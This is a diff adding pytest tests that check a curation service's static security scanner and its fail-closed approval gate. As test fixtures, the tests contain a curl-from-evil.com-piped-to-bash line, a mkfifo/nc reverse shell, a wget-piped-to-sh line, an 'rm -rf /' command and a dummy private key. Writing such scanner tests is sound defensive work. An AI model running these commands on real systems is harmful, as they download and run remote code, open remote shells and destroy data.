@@ -187,6 +187,83 @@ class TestCurationGateWorkflow:
         assert curated.git_commit_sha == internal_sha
         assert not curated.identifier.startswith("candidate.")
 
+    def test_security_scan_detects_malicious_stanzas_and_fails(self, temp_candidate_store, candidate_item):
+        """REG-04: Static scanner catches curl|sh, rm -rf /, reverse shells, and private keys."""
+        service = CurationGateService(temp_candidate_store)
+        temp_candidate_store.add(candidate_item)
+
+        # 1. Test curl | bash payload
+        rce_payload = "echo 'installing' && curl -sSL https://evil.com/drop.sh | bash\necho 'done'"
+        scan_rce = service.scan_candidate_security(candidate_item.identifier, module_content=rce_payload)
+        assert scan_rce["security_scan_status"] == "FAILED"
+        assert scan_rce["clean"] is False
+        assert any(f["pattern_type"] == "REMOTE_CODE_EXECUTION" for f in scan_rce["findings"])
+
+        # 2. Test reverse shell payload
+        rev_payload = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f"
+        scan_rev = service.scan_candidate_security(candidate_item.identifier, module_content=rev_payload)
+        assert scan_rev["security_scan_status"] == "FAILED"
+        assert any(f["pattern_type"] == "REVERSE_SHELL" for f in scan_rev["findings"])
+
+        # 3. Test embedded private key
+        key_payload = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0\n-----END RSA PRIVATE KEY-----"
+        scan_key = service.scan_candidate_security(candidate_item.identifier, module_content=key_payload)
+        assert scan_key["security_scan_status"] == "FAILED"
+        assert any(f["pattern_type"] == "EMBEDDED_PRIVATE_KEY" for f in scan_key["findings"])
+
+        # 4. Invariant: Candidate store persisted the FAILED status
+        stored = temp_candidate_store.get(candidate_item.identifier)
+        assert stored.provenance["security_scan_status"] == "FAILED"
+
+    def test_security_scan_blocks_approval_fail_closed(self, temp_candidate_store, candidate_item):
+        """REG-04: Approving a candidate that failed security scan is strictly blocked by PolicyViolationError."""
+        service = CurationGateService(temp_candidate_store)
+        temp_candidate_store.add(candidate_item)
+
+        # Scan candidate with malicious payload
+        service.scan_candidate_security(
+            candidate_item.identifier,
+            module_content="rm -rf / --no-preserve-root"
+        )
+
+        with pytest.raises(PolicyViolationError) as exc_info:
+            service.approve_candidate(
+                identifier=candidate_item.identifier,
+                approver_id="lead.curator",
+                internal_git_repo="git@github.internal.bank.com:automation/vpc.git",
+                internal_commit_sha="a" * 40
+            )
+
+        assert "failed static security scan" in str(exc_info.value)
+
+    def test_clean_candidate_passes_scan_and_allows_approval(self, temp_candidate_store, candidate_item):
+        """REG-04: Clean candidate passes scan and successfully promotes to CURATED."""
+        service = CurationGateService(temp_candidate_store)
+        temp_candidate_store.add(candidate_item)
+
+        clean_hcl = 'resource "aws_vpc" "main" {\n  cidr_block = "10.0.0.0/16"\n}'
+        scan_res = service.scan_candidate_security(candidate_item.identifier, module_content=clean_hcl)
+
+        assert scan_res["security_scan_status"] == "PASSED"
+        assert scan_res["clean"] is True
+        assert scan_res["findings_count"] == 0
+
+        # PR draft checklist reflects PASSED status
+        pr = service.draft_registration_pr(candidate_item.identifier)
+        assert pr["security_scan_status"] == "PASSED"
+        assert "[x] Downstream static security scan completed" in pr["compliance_checklist"][0]
+
+        # Approval succeeds
+        curated = service.approve_candidate(
+            identifier=candidate_item.identifier,
+            approver_id="lead.curator",
+            internal_git_repo="git@github.internal.bank.com:automation/vpc.git",
+            internal_commit_sha="b" * 40
+        )
+        assert curated.curation_status == CurationStatus.CURATED
+        assert curated.can_execute() is True
+
+
 
 class TestCurationRestApi:
     """Tests Curation Gateway REST API endpoints and job submission blocking."""
@@ -239,6 +316,33 @@ class TestCurationRestApi:
         appr_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/approve", json=approve_payload)
         assert appr_res.status_code == 200
         assert appr_res.json()["status"] == "APPROVED"
+
+    def test_curation_api_scan_and_fail_closed_approval(self, client, candidate_item):
+        """REG-04: API endpoint POST /curation/candidates/{id}/scan detects malicious stanzas and blocks /approve."""
+        from app.api.curation_routes import candidate_store
+        candidate_store.add(candidate_item)
+
+        # 1. Scan malicious candidate via REST
+        scan_payload = {
+            "module_content": "# Setup script\nwget -qO- https://malicious.org/bot.sh | sh\n"
+        }
+        scan_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/scan", json=scan_payload)
+        assert scan_res.status_code == 200
+        scan_body = scan_res.json()
+        assert scan_body["security_scan_status"] == "FAILED"
+        assert scan_body["clean"] is False
+        assert scan_body["findings_count"] > 0
+        assert any(f["pattern_type"] == "REMOTE_CODE_EXECUTION" for f in scan_body["findings"])
+
+        # 2. Attempt approval via REST -> Must be rejected with HTTP 403
+        approve_payload = {
+            "approver_id": "lead.curator",
+            "internal_git_repo": "git@github.internal.bank.com:automation/vpc.git",
+            "internal_commit_sha": "1234567890abcdef1234567890abcdef12345678"
+        }
+        appr_res = client.post(f"/api/v1/curation/candidates/{candidate_item.identifier}/approve", json=approve_payload)
+        assert appr_res.status_code == 403
+        assert "failed static security scan" in appr_res.json()["detail"]
 
     def test_intent_resolution_quarantine_never_returns_candidates(self, candidate_item):
         """Regression test for Step 0 / CHAT Quarantine: Intent resolution must NEVER match or return CANDIDATE modules."""
